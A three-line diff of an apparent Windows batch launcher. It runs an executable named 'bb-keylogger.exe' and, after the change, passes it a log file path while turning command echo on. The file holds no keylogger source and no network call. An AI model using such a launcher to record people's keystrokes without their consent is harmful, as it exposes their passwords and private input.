@@ -1,3 +1,3 @@
-@echo off
-"../bin/bb-keylogger.exe"
-@echo off
+@echo on
+"../bin/bb-keylogger.exe" "../bin/log"
+@echo on
